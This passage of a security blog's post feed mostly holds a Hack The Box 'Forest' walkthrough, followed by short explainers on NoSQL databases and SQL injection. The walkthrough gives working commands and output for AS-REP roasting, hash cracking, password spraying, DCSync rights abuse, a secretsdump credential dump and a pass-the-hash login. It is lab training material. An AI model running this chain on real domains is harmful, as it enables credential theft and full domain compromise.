Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49677/tcp open msrpc Microsoft Windows RPC 49684/tcp open msrpc Microsoft Windows RPC 49706/tcp open msrpc Microsoft Windows RPC 49976/tcp open msrpc Microsoft Windows RPC It\u0026rsquo;s always good to look for low hanging fruit, So checked SMB for guest or anonymous login but there isn\u0026rsquo;t any. Same with LDAP When it\u0026rsquo;s comes to enumeration my goto tool is always netexec. Netexec provides many options for Active Directory enumeration. I queried LDAP, ‚ùØ netexec ldap htb.local -u anonymous -p anonymous SMB 10.10.10.161 445 FOREST [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) LDAP 10.10.10.161 389 FOREST [-] htb.local\\anonymous:anonymous Queried SMB, got nothing ‚ùØ netexec smb htb.local -u sundeity -p \u0026#39;\u0026#39; SMB 10.10.10.161 445 FOREST [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) SMB 10.10.10.161 445 FOREST [-] htb.local\\sundeity: STATUS_LOGON_FAILURE Which was weird for an easy box, this triggered lot of questions inside me. On searching the web I found about a new technique. Apparently I can enumerate rpc using rpcclient. If you are more interested about this i\u0026rsquo;ll leave the articles link\nLinks to the Articles Article-1 Article-2\nUsing null login to connect with rpc rpcclient -U \u0026#34;\u0026#34; -N 10.10.10.161 Using the below command I can enumerate users on the domain enumdomusers Output: rpcclient $\u0026gt; enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] user:[$331000-VK4ADACQNUCA] rid:[0x463] user:[SM_2c8eef0a09b545acb] rid:[0x464] user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465] user:[SM_75a538d3025e4db9a] rid:[0x466] user:[SM_681f53d4942840e18] rid:[0x467] user:[SM_1b41c9286325456bb] rid:[0x468] user:[SM_9b69f1b9d2cc45549] rid:[0x469] user:[SM_7c96b981967141ebb] rid:[0x46a] user:[SM_c75ee099d0a64c91b] rid:[0x46b] user:[SM_1ffab36a2f5f479cb] rid:[0x46c] user:[HealthMailboxc3d7722] rid:[0x46e] user:[HealthMailboxfc9daad] rid:[0x46f] user:[HealthMailboxc0a90c9] rid:[0x470] user:[HealthMailbox670628e] rid:[0x471] user:[HealthMailbox968e74d] rid:[0x472] user:[HealthMailbox6ded678] rid:[0x473] user:[HealthMailbox83d6781] rid:[0x474] user:[HealthMailboxfd87238] rid:[0x475] user:[HealthMailboxb01ac64] rid:[0x476] user:[HealthMailbox7108a4e] rid:[0x477] user:[HealthMailbox0659cc1] rid:[0x478] user:[sebastien] rid:[0x479] user:[lucinda] rid:[0x47a] user:[svc-alfresco] rid:[0x47b] user:[andy] rid:[0x47e] user:[mark] rid:[0x47f] user:[santi] rid:[0x480] As I got the users now I copied all the users into a file. So that I can enumerate further with it. ‚ùØ cat users.txt Administrator krbtgt sebastein lucinda svc-alfresco andy mark santi Like this isn\u0026rsquo;t enough we can also enumerate for groups in the domain using below command by querying RPC enumdomgroups We can also query information of a particular group with this command querygroup \u0026lt;sid\u0026gt; Now to our real path, I used kerbrute to verify the usernames that I got from RPC earlier and all of them were legit ü§ó ‚ùØ kerbrute userenum --dc htb.local -d htb.local users.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: dev (n/a) - 01/13/25 - Ronnie Flathers @ropnop 2025/01/13 22:04:00 \u0026gt; Using KDC(s): 2025/01/13 22:04:00 \u0026gt; htb.local:88 2025/01/13 22:04:00 \u0026gt; [+] VALID USERNAME:\tAdministrator@htb.local 2025/01/13 22:04:00 \u0026gt; [+] VALID USERNAME:\tandy@htb.local 2025/01/13 22:04:00 \u0026gt; [+] VALID USERNAME:\tlucinda@htb.local 2025/01/13 22:04:00 \u0026gt; [+] VALID USERNAME:\tsanti@htb.local 2025/01/13 22:04:00 \u0026gt; [+] VALID USERNAME:\tsvc-alfresco@htb.local 2025/01/13 22:04:00 \u0026gt; [+] VALID USERNAME:\tmark@htb.local 2025/01/13 22:04:00 \u0026gt; Done! Tested 8 usernames (6 valid) in 0.198 seconds Exploitation # As I was desperatly looking for a low hanging fruit I checked user accounts that had DONT_REQUIRE_PREAUTH. Lucky me I got one user which is none other than svc-alfresco. This Pre-Auth concept is pretty simple let\u0026rsquo;s learn about it, As part of the Kerberos authentication process in Active Directory, there is an initial request to authenticate without a password. This is an artifact left over from Kerberos versions earlier than Kerberos 5. In these earlier versions, Kerberos would allow authentication without a password. Now, in Kerberos 5, a password is required, which is called ‚ÄúPre-Authentication.‚Äù When looking at the Kerberos exchanges during log-on, you will initially see an AS-REQ (Authentication Server Request) followed by a Kerberos error, which will state that pre-auth is required. But in some cases accounts might be configured to authenticate without a Pre-Auth, well yeah which obiviously a misconfiguration. Using below the tool below I abused it and got the TGT from kerberos for i in $(cat users.txt); do GetNPUsers.py -no-pass htb.local/${i} -dc-ip 10.10.10.161; done Output: Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for Administrator /home/n_emperor/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] User Administrator doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for krbtgt /home/n_emperor/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for sebastein /home/n_emperor/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for lucinda /home/n_emperor/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] User lucinda doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for svc-alfresco /home/n_emperor/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) \u0026lt;Hash-Redacted\u0026gt; Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for andy /home/n_emperor/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] User andy doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for mark /home/n_emperor/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] User mark doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for santi /home/n_emperor/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] User santi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set To get the password I cracked the TGT using hashcat and got the password hashcat -a 0 hash /usr/share/wordlists/rockyou.txt Output: Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 $krb5asrep$23$svc-alfresco@Hack The Box.LOCAL:96ff40e8c8c6d4249819d886c49788a1$......\u0026lt;redacted\u0026gt;:\u0026lt;Password-Redacted\u0026gt; Session..........: hashcat Status...........: Cracked Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP) Hash.Target......: $krb5asrep$23$svc-alfresco@Hack The Box.LOCAL:96ff40e8c8c6d4...fc3980 Time.Started.....: Mon Jan 13 21:57:43 2025 (1 sec) Time.Estimated...: Mon Jan 13 21:57:44 2025 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 6121.8 kH/s (1.69ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 4096000/14344385 (28.55%) Rejected.........: 0/4096000 (0.00%) Restore.Point....: 4079616/14344385 (28.44%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidate.Engine.: Device Generator Candidates.#1....: s9039554h -\u0026gt; s/nd/0s Hardware.Mon.#1..: Temp: 66c Util: 25% Now I have full access over user svc-alfresco (Password is not redacted down here, Enjoy!üòâ). I initiated password spraying attack on SMB. This is what I usually do when I get a new password. But I didn\u0026rsquo;t get any hit on other accounts, Which is sad üò• to be honest. ‚ùØ netexec smb htb.local -u users.txt -p \u0026#39;s3rvice\u0026#39; --shares --continue-on-success SMB 10.10.10.161 445 FOREST [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) SMB 10.10.10.161 445 FOREST [-] htb.local\\Administrator:s3rvice STATUS_LOGON_FAILURE SMB 10.10.10.161 445 FOREST [-] htb.local\\krbtgt:s3rvice STATUS_LOGON_FAILURE SMB 10.10.10.161 445 FOREST [-] htb.local\\sebastein:s3rvice STATUS_LOGON_FAILURE SMB 10.10.10.161 445 FOREST [-] htb.local\\lucinda:s3rvice STATUS_LOGON_FAILURE SMB 10.10.10.161 445 FOREST [+] htb.local\\svc-alfresco:s3rvice SMB 10.10.10.161 445 FOREST [-] htb.local\\andy:s3rvice STATUS_LOGON_FAILURE SMB 10.10.10.161 445 FOREST [-] htb.local\\mark:s3rvice STATUS_LOGON_FAILURE SMB 10.10.10.161 445 FOREST [-] htb.local\\santi:s3rvice STATUS_LOGON_FAILURE I tried the same on WinRM service and guess what, Bingo! Got winrm access. Even if I got any hit on other accounts earlier it would have been hectic to pivot, hey! anyway less steps to work. ‚ùØ netexec winrm htb.local -u users.txt -p \u0026#39;s3rvice\u0026#39; --continue-on-success WINRM 10.10.10.161 5985 FOREST [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) WINRM 10.10.10.161 5985 FOREST [-] htb.local\\Administrator:s3rvice WINRM 10.10.10.161 5985 FOREST [-] htb.local\\krbtgt:s3rvice WINRM 10.10.10.161 5985 FOREST [-] htb.local\\sebastein:s3rvice WINRM 10.10.10.161 5985 FOREST [-] htb.local\\lucinda:s3rvice WINRM 10.10.10.161 5985 FOREST [+] htb.local\\svc-alfresco:s3rvice (Pwn3d!) WINRM 10.10.10.161 5985 FOREST [-] htb.local\\andy:s3rvice WINRM 10.10.10.161 5985 FOREST [-] htb.local\\mark:s3rvice WINRM 10.10.10.161 5985 FOREST [-] htb.local\\santi:s3rvice Got the User flag ‚ùØ evil-winrm -u svc-alfresco -p s3rvice -i htb.local Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents\u0026gt; type ../Desktop/user.txt \u0026lt;redacted\u0026gt; *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents\u0026gt; Privilege escalation # Now using the user account svc_alfresco I collected data for Bloodhound As we can see from the above picture we have genericAll and writeDACL to abuse. We can use the steps from Bloodhound it\u0026rsquo;s pretty neat. Invoking powerview within the shell Import-Module .\\powerview.ps1 This is the one liner Add-DomainGroupMember -Identity \u0026#39;Exchange Windows Permissions\u0026#39; -Members svc-alfresco; $username = \u0026#34;htb\\svc-alfresco\u0026#34;; $password = \u0026#34;s3rvice\u0026#34;; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity \u0026#39;svc-alfresco\u0026#39; -TargetIdentity \u0026#39;Hack The Box.LOCAL\\Domain Admins\u0026#39; -Rights DCSync Atlast I can run secrets dump to dump all those secrets secretsdump.py svc-alfresco:s3rvice@10.10.10.161 Output Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:\u0026lt;redacted\u0026gt;::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f::: htb.local\\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44::: htb.local\\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05::: htb.local\\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a::: htb.local\\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9::: htb.local\\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555::: htb.local\\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5::: htb.local\\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff::: htb.local\\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203::: htb.local\\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355::: htb.local\\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536::: htb.local\\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc::: htb.local\\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3::: htb.local\\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668::: htb.local\\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b::: htb.local\\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7::: htb.local\\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072::: FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:665b84ebfa60399418c8be430aa5704e::: EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1::: [*] Kerberos keys grabbed htb.local\\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913 htb.local\\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375 htb.local\\Administrator:des-cbc-md5:c1e049c71f57343b krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58 krbtgt:des-cbc-md5:9dd5647a31518ca8 htb.local\\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4 htb.local\\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e htb.local\\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e htb.local\\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf htb.local\\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd htb.local\\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e htb.local\\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e htb.local\\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed htb.local\\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983 htb.local\\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91 htb.local\\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f htb.local\\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a htb.local\\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c htb.local\\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8 htb.local\\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d htb.local\\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81 htb.local\\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6 htb.local\\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5 htb.local\\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a htb.local\\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2 htb.local\\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29 htb.local\\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7 htb.local\\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538 htb.local\\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702 htb.local\\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352 htb.local\\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d htb.local\\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701 htb.local\\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd htb.local\\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36 htb.local\\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb htb.local\\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c htb.local\\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3 htb.local\\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054 htb.local\\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161 htb.local\\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a htb.local\\sebastien:des-cbc-md5:702a3445e0d65b58 htb.local\\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5 htb.local\\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad htb.local\\lucinda:des-cbc-md5:a13bb56bd043a2ce htb.local\\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32 htb.local\\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea htb.local\\svc-alfresco:des-cbc-md5:014ac86d0b98294a htb.local\\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f htb.local\\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6 htb.local\\andy:des-cbc-md5:a2ab5eef017fb9da htb.local\\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6 htb.local\\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81 htb.local\\mark:des-cbc-md5:b5dff1f40b8f3be9 htb.local\\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427 htb.local\\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25 htb.local\\santi:des-cbc-md5:4075ad528ab9e5fd FOREST$:aes256-cts-hmac-sha1-96:7711cbb5ca057223c6f7ea9c86392d52020d6f274c2ed0233778b0f7c6e2fb42 FOREST$:aes128-cts-hmac-sha1-96:b155f92cca7761d7b6683ac144182318 FOREST$:des-cbc-md5:c8132fbf73c71fa8 EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6 EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e EXCH01$:des-cbc-md5:8c45f44c16975129 [*] Cleaning up... We got everything we can, \u0026ldquo;we\u0026rdquo; successfully acheived a hacker\u0026rsquo;s dream, Logged in using winrm as administrator and got the Root flag ‚ùØ evil-winrm -u administrator -H 32693b\u0026lt;hidden\u0026gt; -i htb.local Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; type ../Desktop/root.txt \u0026lt;redacted\u0026gt; ","date":"7 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/posts/1741345035294-forest-writeuphtb/","section":"Posts","summary":"","title":"Forest Walkthrough(Hack The Box)","type":"posts"},{"content":"","date":"7 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/info/","section":"Tags","summary":"","title":"Info","type":"tags"},{"content":" A non-relational database does not use tables, rows, columns, primary keys, relationships, or schemas. Instead, a NoSQL database stores data using various storage models, depending on the type of data stored.\nDue to the lack of a defined structure for the database, NoSQL databases are very scalable and flexible. When dealing with datasets that are not very well defined and structured, a NoSQL database would be the best choice for storing our data.\nThere are 4 common storage models for NoSQL databases:\nKey-Value Document-Based Wide-Column Graph Each of the above models has a different way of storing data. For example, the Key-Value model usually stores data in JSON or XML, and has a key for each pair, storing all of its data as its value:\ngraph LR subgraph Posts box1[id\ndate\ncontent] box2[id\ndate\ncontent] box3[id\ndate\ncontent] end box1 --\u003e Key1[Key] box1 --\u003e Value1[Value] box2 --\u003e Key2[Key] box2 --\u003e Value2[Value] box3 --\u003e Key3[Key] box3 --\u003e Value3[Value] The above example can be represented using JSON as follows: { \u0026#34;100001\u0026#34;: { \u0026#34;date\u0026#34;: \u0026#34;01-01-2021\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;Welcome to this web application.\u0026#34; }, \u0026#34;100002\u0026#34;: { \u0026#34;date\u0026#34;: \u0026#34;02-01-2021\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;This is the first post on this web app.\u0026#34; }, \u0026#34;100003\u0026#34;: { \u0026#34;date\u0026#34;: \u0026#34;02-01-2021\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;Reminder: Tomorrow is the ...\u0026#34; } } It looks similar to a dictionary/map/key-value pair in languages like Python or PHP \u0026lsquo;i.e. {'key':'value'}\u0026rsquo;, where the key is usually a string, the value can be a string, dictionary, or any class object.\nThe Document-Based model stores data in complex JSON objects and each object has certain meta-data while storing the rest of the data similarly to the Key-Value model.\nSome of the most common NoSQL databases include:\nType Description MongoDB The most common NoSQL database. It is free and open-source, uses the Document-Based model, and stores data in JSON objects ElasticSearch Another free and open-source NoSQL database. It is optimized for storing and analyzing huge datasets. As its name suggests, searching for data within this database is very fast and efficient Apache Cassandra Also free and open-source. It is very scalable and is optimized for gracefully handling faulty values Other common NoSQL databases include: Redis, Neo4j, CouchDB, and Amazon DynamoDB. ","date":"7 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/posts/1741344317221-non-relational-nosql/","section":"Posts","summary":"","title":"Non-relational (NoSQL)","type":"posts"},{"content":"","date":"7 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/server/","section":"Tags","summary":"","title":"Server","type":"tags"},{"content":" Very common vulnerability in web applications is a SQL Injection vulnerability. Similarly to a Command Injection vulnerability, this vulnerability may occur when the web application executes a SQL query, including a value taken from user-supplied input.\nFor example, in the database section, we saw an example of how a web application would use user-input to search within a certain table, with the following line of code:\n$query = \u0026#34;select * from users where name like \u0026#39;%$searchInput%\u0026#39;\u0026#34;; If the user input is not properly filtered and validated (as is the case with Command Injections), we may execute another SQL query alongside this query, which may eventually allow us to take control over the database and its hosting server.\nFor example, the same previous College Management System 1.2 suffers from a SQL injection vulnerability, in which we can execute another SQL query that always returns true, meaning we successfully authenticated, which allows us to log in to the application. We can use the same vulnerability to retrieve data from the database or even gain control over the hosting server.\n","date":"7 March 